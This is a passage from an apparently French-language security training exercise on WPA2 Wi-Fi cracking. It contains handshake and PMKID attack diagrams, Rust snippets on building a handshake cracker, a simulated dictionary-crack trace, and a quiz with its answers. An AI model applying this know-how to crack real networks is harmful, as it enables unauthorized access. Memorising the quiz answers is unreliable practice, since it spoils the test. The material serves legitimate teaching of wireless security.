      ‚îÇ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ Message 2 ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ñ∫‚îÇ
      ‚îÇ        SNonce + MIC (proves knowledge        ‚îÇ
      ‚îÇ        of PMK without revealing it)          ‚îÇ
      ‚îÇ                                              ‚îÇ
      ‚îÇ         ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê   ‚îÇ
      ‚îÇ         ‚îÇ AP calculates PTK (same way)   ‚îÇ   ‚îÇ
      ‚îÇ         ‚îÇ Verifies MIC                   ‚îÇ   ‚îÇ
      ‚îÇ         ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò   ‚îÇ
      ‚îÇ                                              ‚îÇ
      ‚îÇ‚óÑ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ Message 3 ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÇ
      ‚îÇ        GTK (encrypted) + MIC                ‚îÇ
      ‚îÇ        Install PTK signal                   ‚îÇ
      ‚îÇ                                              ‚îÇ
      ‚îÇ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ Message 4 ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ñ∫‚îÇ
      ‚îÇ        ACK (confirms installation)          ‚îÇ
      ‚îÇ                                              ‚îÇ
      ‚îÇ         ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê   ‚îÇ
      ‚îÇ         ‚îÇ BOTH NOW HAVE:                 ‚îÇ   ‚îÇ
      ‚îÇ         ‚îÇ - PTK for unicast              ‚îÇ   ‚îÇ
      ‚îÇ         ‚îÇ - GTK for broadcast/multicast  ‚îÇ   ‚îÇ
      ‚îÇ         ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò   ‚îÇ


WPA2 KEY HIERARCHY
‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

        Password + SSID
              ‚îÇ
              ‚ñº
        ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
        ‚îÇ    PBKDF2       ‚îÇ
        ‚îÇ  4096 iterations‚îÇ
        ‚îÇ    SHA-1        ‚îÇ
        ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
                 ‚îÇ
                 ‚ñº
        ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
        ‚îÇ      PMK        ‚îÇ  256 bits (32 bytes)
        ‚îÇ (Pairwise       ‚îÇ  Same on both sides
        ‚îÇ  Master Key)    ‚îÇ  if password correct
        ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
                 ‚îÇ
                 ‚îÇ + ANonce + SNonce + AP_MAC + STA_MAC
                 ‚îÇ
                 ‚ñº
        ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
        ‚îÇ      PTK        ‚îÇ  512 bits (64 bytes)
        ‚îÇ (Pairwise       ‚îÇ
        ‚îÇ  Transient Key) ‚îÇ
        ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
                 ‚îÇ
     ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
     ‚îÇ           ‚îÇ           ‚îÇ
     ‚ñº           ‚ñº           ‚ñº
  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê    ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê    ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
  ‚îÇ KCK ‚îÇ    ‚îÇ KEK ‚îÇ    ‚îÇ TK  ‚îÇ
  ‚îÇ128b ‚îÇ    ‚îÇ128b ‚îÇ    ‚îÇ128b ‚îÇ
  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò    ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò    ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
     ‚îÇ           ‚îÇ           ‚îÇ
     ‚îÇ           ‚îÇ           ‚îî‚îÄ‚Üí Traffic Encryption
     ‚îÇ           ‚îî‚îÄ‚Üí Key Encryption (GTK delivery)
     ‚îî‚îÄ‚Üí MIC Calculation


PMKID ATTACK (NO FULL HANDSHAKE NEEDED)
‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

                 AP                          Attacker
                  ‚îÇ                              ‚îÇ
                  ‚îÇ‚óÑ‚îÄ‚îÄ‚îÄ‚îÄ Association Request ‚îÄ‚îÄ‚îÄ‚îÄ‚îÇ
                  ‚îÇ                              ‚îÇ
                  ‚îÇ‚îÄ‚îÄ‚îÄ‚îÄ Message 1 + PMKID ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ñ∫‚îÇ
                  ‚îÇ                              ‚îÇ
                  ‚îÇ    ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê ‚îÇ
                  ‚îÇ    ‚îÇ PMKID = HMAC-SHA1-128 ‚îÇ ‚îÇ
                  ‚îÇ    ‚îÇ   (PMK, "PMK Name" || ‚îÇ ‚îÇ
                  ‚îÇ    ‚îÇ    AP_MAC || STA_MAC) ‚îÇ ‚îÇ
                  ‚îÇ    ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò ‚îÇ
                  ‚îÇ                              ‚îÇ
                  ‚îÇ    Attacker can now crack   ‚îÇ
                  ‚îÇ    offline! No client       ‚îÇ
                  ‚îÇ    interaction needed!      ‚îÇ


SECURITY PROTOCOL EVOLUTION
‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

WEP (1997) ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ñ∫ BROKEN
    ‚îÇ  RC4 stream cipher
    ‚îÇ  24-bit IV ‚Üí collisions after ~5000 packets
    ‚îÇ  No authentication

WPA (2003) ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ñ∫ DEPRECATED
    ‚îÇ  TKIP (Temporal Key Integrity Protocol)
    ‚îÇ  Per-packet key mixing
    ‚îÇ  Still uses RC4

WPA2 (2004) ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ñ∫ CURRENT (but offline attack vulnerable)
    ‚îÇ  CCMP (Counter Mode CBC-MAC Protocol)
    ‚îÇ  AES-128
    ‚îÇ  PSK or Enterprise (802.1X)

WPA3 (2018) ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ñ∫ RECOMMENDED
       SAE (Simultaneous Authentication of Equals)
       Dragonfly key exchange
       No offline dictionary attacks
       Forward secrecy
```

### 5.4 Les pieges en detail

#### Piege 1 : Handshake incomplet

```rust
// MAUVAIS : Requiert les 4 messages
fn is_complete(hs: &Handshake) -> bool {
    hs.messages.len() == 4
}

// BON : 2 messages suffisent pour cracker
fn is_complete(hs: &Handshake) -> bool {
    !hs.anonce.is_empty() && !hs.snonce.is_empty() && !hs.mic.is_empty()
}
```

#### Piege 2 : Ordre des MACs/Nonces

```rust
// MAUVAIS : Ordre fixe
data.extend_from_slice(ap_mac);
data.extend_from_slice(client_mac);

// BON : Ordre canonique (min first)
if ap_mac < client_mac {
    data.extend_from_slice(ap_mac);
    data.extend_from_slice(client_mac);
} else {
    data.extend_from_slice(client_mac);
    data.extend_from_slice(ap_mac);
}
```

### 5.5 Cours Complet

#### 5.5.1 PBKDF2 dans WPA2

```
PMK = PBKDF2(HMAC-SHA1, password, SSID, 4096, 256)
```

- **4096 iterations** : Ralentit le bruteforce
- **SSID comme salt** : Empeche les rainbow tables universelles
- **256 bits** : Taille du PMK

#### 5.5.2 PRF (Pseudo-Random Function)

WPA2 utilise PRF-384 ou PRF-512 pour generer le PTK:

```
PTK = PRF(PMK, "Pairwise key expansion",
          min(AA,SA) || max(AA,SA) || min(AN,SN) || max(AN,SN))
```

### 5.6 Normes

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ ‚ùå HORS NORME (compile, mais interdit)                          ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ pbkdf2(..., 1000, ...);  // Mauvais nombre d'iterations         ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ ‚úÖ CONFORME                                                     ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ pbkdf2(..., 4096, ...);  // Standard WPA2                       ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ üìñ POURQUOI ?                                                   ‚îÇ
‚îÇ                                                                 ‚îÇ
‚îÇ ‚Ä¢ WPA2 specifie exactement 4096 iterations                      ‚îÇ
‚îÇ ‚Ä¢ Moins d'iterations = PMK invalide                             ‚îÇ
‚îÇ ‚Ä¢ Le MIC ne matchera jamais avec le mauvais PMK                 ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

### 5.7 Simulation avec trace d'execution

**Scenario:** Crack du handshake avec password "wifi2024"

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ Etape ‚îÇ Operation                       ‚îÇ Resultat                 ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ   1   ‚îÇ Try "password123"               ‚îÇ MIC mismatch             ‚îÇ
‚îÇ   2   ‚îÇ PMK = PBKDF2("password123", ..) ‚îÇ PMK: 0x7a3b...           ‚îÇ
‚îÇ   3   ‚îÇ PTK = PRF(PMK, ...)             ‚îÇ PTK: 0x8c4d...           ‚îÇ
‚îÇ   4   ‚îÇ Verify MIC                      ‚îÇ FAIL                     ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ   5   ‚îÇ Try "wifi2024"                  ‚îÇ MIC MATCH!               ‚îÇ
‚îÇ   6   ‚îÇ PMK = PBKDF2("wifi2024", ...)   ‚îÇ PMK: 0xde4f...           ‚îÇ
‚îÇ   7   ‚îÇ PTK = PRF(PMK, ...)             ‚îÇ PTK: 0x9f2a...           ‚îÇ
‚îÇ   8   ‚îÇ Verify MIC                      ‚îÇ SUCCESS!                 ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
Password found: wifi2024
```

### 5.8 Mnemotechniques

#### üé¨ MEME : "Serial Experiments Lain" - The Wired

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ                                                                 ‚îÇ
‚îÇ  "No matter where you are, everyone is always connected"        ‚îÇ
‚îÇ                                                                 ‚îÇ
‚îÇ  üì° BEACON = "Present day, present time" announcement           ‚îÇ
‚îÇ     ‚Üí L'AP annonce son existence au monde                       ‚îÇ
‚îÇ     ‚Üí SSID = Son nom dans le Wired                              ‚îÇ
‚îÇ                                                                 ‚îÇ
‚îÇ  üîë HANDSHAKE = "Lain connecting to the Wired"                  ‚îÇ
‚îÇ     ‚Üí 4 messages = 4 couches de verification                    ‚îÇ
‚îÇ     ‚Üí PMK = La conscience partagee                              ‚îÇ
‚îÇ     ‚Üí PTK = Le lien unique entre deux entites                   ‚îÇ
‚îÇ                                                                 ‚îÇ
‚îÇ  üîì CRACKING = "Knights of the Eastern Calculus"                ‚îÇ
‚îÇ     ‚Üí Ils brisent les barrieres du Wired                        ‚îÇ
‚îÇ     ‚Üí Dictionary = Le livre des mots de passe                   ‚îÇ
‚îÇ     ‚Üí PMKID = Backdoor sans negociation                         ‚îÇ
‚îÇ                                                                 ‚îÇ
‚îÇ  üõ°Ô∏è WPA3-SAE = "Lain's evolution"                              ‚îÇ
‚îÇ     ‚Üí Dragonfly = Protection contre les Knights                 ‚îÇ
‚îÇ     ‚Üí Pas d'attaque offline possible                            ‚îÇ
‚îÇ                                                                 ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

### 5.9 Applications pratiques

1. **WiFi Pentesting** : Capture et crack de handshakes
2. **Wireless Auditing** : Evaluation de la posture securite
3. **Forensics** : Analyse de captures wireless
4. **IoT Security** : Securite des objets connectes

---

## ‚ö†Ô∏è SECTION 6 : PIEGES ‚Äî RECAPITULATIF

| # | Piege | Consequence | Solution |
|---|-------|-------------|----------|
| 1 | Mauvais nombre iterations PBKDF2 | PMK invalide | Toujours 4096 |
| 2 | Ordre MACs/Nonces | PTK invalide | Trier min/max |
| 3 | Handshake "incomplet" | Rate le crack | 2 messages suffisent |
| 4 | Parse MAC panic | Crash | Handle errors |
| 5 | Ignorer le cipher | Faux score | TKIP = faible |

---

## üìù SECTION 7 : QCM

### Q1. Combien d'iterations PBKDF2 utilise WPA2 ?

- A) 1000
- B) 2048
- C) 4096
- D) 10000

**Reponse : C**

### Q2. Que permet l'attaque PMKID ?

- A) Cracker sans handshake complet
- B) Intercepter le trafic
- C) Creer un rogue AP
- D) Deauthentiquer les clients

**Reponse : A**

### Q3. Quel protocole WPA3 resiste aux attaques offline ?

- A) PSK
- B) SAE (Dragonfly)
- C) TKIP
- D) CCMP

**Reponse : B**

### Q4. Quelle partie du PTK est utilisee pour calculer le MIC ?

- A) TK (Temporal Key)
- B) KEK (Key Encryption Key)
- C) KCK (Key Confirmation Key)
- D) GTK (Group Temporal Key)

**Reponse : C**

### Q5. Pourquoi WEP est-il casse ?

- A) Cle trop courte
- B) IV de 24 bits cause des collisions
- C) Pas de chiffrement
- D) Utilise DES

**Reponse : B**

---

## üìä SECTION 8 : RECAPITULATIF

| Concept | Implementation | Points Cles |
|---------|----------------|-------------|
| Frame Parsing | Type/Subtype identification | Management vs Data |
| PMK Derivation | PBKDF2(password, SSID, 4096) | Salt = SSID |
| PTK Derivation | PRF(PMK, nonces, MACs) | Ordre canonique |
| MIC Verification | HMAC-SHA1(KCK, frame) | Premier 128 bits |
| Security Score | Protocol + cipher analysis | WEP=0, WPA3=95 |

---

## üì¶ SECTION 9 : DEPLOYMENT PACK

```json
{
  "deploy": {
    "hackbrain_version": "5.5.2",
    "exercise_slug": "3.2.7-a-airwave-hunter",
    "metadata": {
      "exercise_id": "3.2.12",
      "exercise_name": "airwave_hunter",
      "module": "3.2.7",
      "module_name": "Wireless Security",
      "difficulty": 8,
      "language": "rust",
      "xp_base": 400,
      "tags": ["wireless", "wpa2", "handshake", "pmkid", "802.11", "cracking"]
    }
  }
}
```

---

*HACKBRAIN v5.5.2 ‚Äî Airwave Hunter*
*"No matter where you are, everyone is always connected"*
